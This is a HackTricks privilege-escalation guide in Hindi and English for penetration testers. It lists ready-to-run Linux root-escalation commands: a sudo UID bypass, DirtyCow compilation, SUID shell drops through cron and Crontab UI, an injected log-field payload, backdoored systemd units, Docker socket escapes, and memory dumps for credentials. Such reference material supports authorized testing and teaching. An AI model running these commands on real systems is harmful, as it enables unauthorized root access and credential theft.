# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी इकट्ठा करना शुरू करें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वैरिएबल के किसी भी फ़ोल्डर पर लिखने की अनुमति रखते हैं** तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version जांचें और देखें कि कोई exploit है जिसे privileges escalate करने के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **kernel version को Google में खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में उल्लिखित हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

निम्नलिखित में दिखाई देने वाले कमजोर Sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo का संस्करण कमजोर है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** पर कि इस **उदाहरण** में इस vuln को कैसे exploited किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### और सिस्टम एनेमरेशन
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित बचावों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं तो आप उससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें कि **what is mounted and unmounted**, कहाँ और क्यों। अगर कुछ भी unmounted है तो आप उसे mount करके निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही, जाँच करें कि **any compiler is installed**. यह उपयोगी है अगर आपको कोई kernel exploit उपयोग करना हो क्योंकि यह सलाह दी जाती है कि उसे उसी मशीन पर compile किया जाए जहाँ आप उसे उपयोग करने वाले हैं (या किसी समान मशीन पर).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर स्थापित

स्थापित पैकेज और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploit किया जा सके…\
अनुशंसित है कि अधिक संदिग्ध स्थापित सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH पहुँच है, तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का उपयोग भी कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगे जो ज्यादातर उपयोगी नहीं होगी, इसलिए OpenVAS जैसे applications या समान टूल की सलाह दी जाती है जो यह जाँचें कि कोई भी इंस्टॉल किया गया सॉफ़्टवेयर वर्शन ज्ञात exploits के लिए vulnerable तो नहीं है_

## Processes

देखें कि कौन से **processes** चल रहे हैं और जाँचें कि कोई process **उसे मिलने वाले अधिकारों से अधिक privileges तो नहीं रखता** (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.  
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग processes को monitor करने के लिए कर सकते हैं। यह उन vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है जो बार-बार execute हो रही हों या जब कुछ requirements पूरे हों।

### Process memory

कुछ सर्विसेज़ सर्वर की मेमोरी में **credentials in clear text inside the memory** सेव कर देती हैं।  
आम तौर पर आपको अन्य users के processes की memory पढ़ने के लिए **root privileges** की ज़रूरत होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से root हों और और भी credentials खोजना चाहते हों।  
हालाँकि, याद रखें कि **as a regular user you can read the memory of the processes you own**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकतर मशीनें **don't allow ptrace by default** होती हैं, जिसका मतलब है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर पाएँगे।
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी प्रोसेस को debug किया जा सकता है, बशर्ते उनका वही uid हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service की memory तक access है (उदाहरण के लिए) तो आप Heap निकाल कर उसके अंदर के credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि मेमोरी उस प्रक्रिया के वर्चुअल एड्रेस स्पेस में कैसे मैप की गई है**; यह **प्रत्येक मैप्ड क्षेत्र की permissions** भी दिखाता है।  
यह **mem** pseudo file **प्रक्रिया की मेमोरी को स्वयं उजागर करता है**।  
हमें **maps** फ़ाइल से पता चलता है कि कौन से **memory regions readable हैं** और उनके offsets।  
हम इस जानकारी का उपयोग करके **mem file में seek करके सभी readable regions को dump करना** और उन्हें एक फ़ाइल में सेव करना करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। Kernel के वर्चुअल एड्रेस स्पेस तक /dev/kmem का उपयोग करके पहुँच किया जा सकता है.\  
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के लिए Sysinternals सूट के क्लासिक ProcDump टूल का Linux पर पुनर्कल्पनात्मक संस्करण है।  
इसे प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

process memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताएँ हटाकर अपने स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory को dump करने के अलग तरीके मिलें) और memory के अंदर credentials खोजें:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **सादा-पाठ क्रेडेंशियल्स चोरी करेगा** और कुछ **जाने-पहचाने फ़ाइलों** से भी। सही ढंग से काम करने के लिए इसे root privileges की आवश्यकता होती है।

| विशेषता                                           | प्रक्रिया का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) running as root – वेब-आधारित scheduler privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback से बाइंड है, तो आप इसे SSH local port-forwarding के माध्यम से पहुँच सकते हैं और एक privileged job बनाकर escalate कर सकते हैं।

Typical chain
- loopback-only पोर्ट खोजें (उदा., 127.0.0.1:8000) और Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- ऑपरेशनल artifacts में credentials खोजें:
  - Backups/scripts जिनमें `zip -P <password>`
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` प्रकट करता है
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित user और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से पहुँच सीमित करें; passwords का reuse न करें
- unit files में secrets embed करने से बचें; secret stores या केवल root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँच करें कि कोई scheduled job vulnerable है या नहीं। शायद आप उस script का फायदा उठा सकते हैं जो root द्वारा चलाया जा रहा है (wildcard vuln? क्या आप उन फाइलों को modify कर सकते हैं जिन्हें root उपयोग करता है? symlinks का उपयोग करें? उस directory में specific files बनाएं जिसे root उपयोग करता है?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab के अंदर root user PATH सेट किए बिना किसी कमांड या स्क्रिप्ट को चलाने की कोशिश करता है। For example: _\* \* \* \* root overwrite.sh_\
तब, आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron का उपयोग script के साथ जिसमें एक wildcard हो (Wildcard Injection)

यदि कोई script root द्वारा executed की जा रही हो और किसी command के अंदर “**\***” मौजूद हो, तो आप इसे exploit करके अनपेक्षित चीज़ें कर सकते हैं (जैसे privesc). उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी पथ से पहले आता है जैसे** _**/some/path/\***_ **, तो यह कमज़ोर नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter/variable expansion और command substitution करता है। यदि कोई root cron/parser untrusted log फ़ील्ड पढ़कर उन्हें arithmetic context में फीड करता है, तो attacker command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होगा।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, उसके बाद word splitting और pathname expansion. इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसा मान पहले substitute होता है (कमांड चलता है), फिर बाक़ी शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि स्क्रिप्ट बिना error के जारी रहे।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log में attacker-controlled text लिखवाएँ ताकि numeric-सा दिखने वाला फ़ील्ड command substitution समाहित करे और किसी अंक पर समाप्त हो। सुनिश्चित करें कि आपका command stdout पर कुछ न प्रिंट करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित किया गया script किसी ऐसे **directory where you have full access** का उपयोग करता है, तो उस फ़ोल्डर को हटाकर और किसी अन्य फ़ोल्डर की ओर **create a symlink folder to another one** बनाकर जो आपके द्वारा नियंत्रित script की सेवा करे, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप प्रक्रियाओं की निगरानी करके उन प्रोसेसों को खोज सकते हैं जो हर 1, 2 या 5 मिनट में चल रहे हों। शायद आप इसका फायदा उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **monitor every 0.1s during 1 minute**, **sort by less executed commands** और सबसे ज्यादा executed commands को delete करने के लिए, आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका उपयोग भी कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली प्रक्रिया की निगरानी करेगा और उन्हें सूचीबद्ध करेगा)।

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जाए **एक टिप्पणी के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं तो आप इसे **modify** कर सकते हैं ताकि यह सेवा के **started**, **restarted** या **stopped** होने पर आपका **backdoor** **executes** कर दे (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए अपनी backdoor `.service` फ़ाइल के अंदर बनायें: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि यदि आपके पास **write permissions over binaries being executed by services** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब services पुनः execute हों तो backdoors execute हों।

### **systemd** PATH - Relative Paths

आप वह PATH देख सकते हैं जिसे **systemd** उपयोग कर रहा है:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फ़ोल्डर में **write** कर सकते हैं, तो आप संभवतः **escalate privileges** कर सकते हैं। आपको इस तरह की फ़ाइलों में **relative paths being used on service configurations** की खोज करनी होगी, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH folder के अंदर जिस पर आप लिख सकते हैं, उसी relative path binary के नाम जैसा एक **executable** बनाएं — और जब सेवा vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, आपका **backdoor** execute हो जाएगा (अनप्रिविलेज्ड users आमतौर पर services को start/stop नहीं कर सकते, लेकिन देखें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** systemd unit files होते हैं जिनका नाम `**.timer**` पर खत्म होता है और वे `**.service**` फाइलों या events को control करते हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously चलाया जा सकता है।

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूद इकाइयों (जैसे कि `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> वह unit जिसे यह timer समाप्त होने पर activate किया जाएगा। आर्गुमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उसी नाम वाली service पर डिफ़ॉल्ट होता है जैसा timer unit है, केवल suffix अलग होता है। (See above.) यह सुझाया जाता है कि activate होने वाले unit का नाम और timer unit का नाम suffix के अलावा एक समान हों।

Therefore, to abuse this permission you would need to:

- कुछ systemd unit (जैसे `.service`) खोजें जो **executing a writable binary** हो
- कोई systemd unit खोजें जो **executing a relative path** हो और आपके पास **writable privileges** over the **systemd PATH** हों (ताकि आप उस executable को impersonate कर सकें)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

Timer enable करने के लिए आपको root privileges चाहिए और निम्न command चलानी होगी:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) क्लाइंट-सर्वर मॉडल में एक ही या अलग मशीनों पर **process communication** सक्षम करते हैं। वे इंटर-कंप्यूटर संचार के लिए मानक Unix descriptor फाइलों का उपयोग करते हैं और `.socket` फाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर, कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं पर सारांश का उपयोग यह **बताने के लिए किया जाता है कि यह किस जगह सुनने वाला है** (AF_UNIX socket फाइल का पाथ, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)
- `Accept`: यह एक boolean argument लेता है। अगर **true** है, तो **प्रत्येक आने वाले कनेक्शन के लिए एक service instance spawn** किया जाता है और केवल कनेक्शन socket ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **स्टार्ट किए गए service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit spawn होती है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक single service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करती है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons को केवल `Accept=no` के अनुकूल तरीके से लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जिन्हें listening **sockets**/FIFOs के **बने और bind होने** के **पहले** या **बाद**, क्रमशः, निष्पादित किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **बंद और हटाए जाने** के **पहले** या **बाद**, क्रमशः, निष्पादित किये जाते हैं।
- `Service`: incoming traffic पर **activate करने के लिए** किस **service** unit का नाम specify करता है। यह सेटिंग केवल उन sockets के लिए allowed है जिनमें `Accept=no`। यह डिफ़ॉल्ट रूप से उस service को सेट करता है जिसका नाम socket के समान होता है (suffix बदलकर)। ज्यादातर मामलों में, इस option का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप कोई **writable** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और यह backdoor socket बनाये जाने से पहले execute हो जाएगा। इसलिए, आपको **शायद मशीन को reboot करने तक प्रतीक्षा करनी पड़ेगी।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

यदि आप किसी भी **writable socket** की पहचान करते हैं (_अब हम config `.socket` फाइलों के बारे में नहीं बल्कि Unix Sockets के बारे में बात कर रहे हैं_), तो **आप उस socket के साथ communicate कर सकते हैं** और शायद किसी vulnerability को exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket फाइलों की बात नहीं कर रहा बल्कि उन फाइलों की जो unix sockets के रूप में काम कर रही हैं_)। आप इसे इस कमांड से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability** कर सकें।

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host की फ़ाइल प्रणाली पर root-स्तरीय access के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का सीधा उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ऐसा request भेजें जो host सिस्टम की रूट डायरेक्टरी को mount करने वाला container बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नया बनाया गया container शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

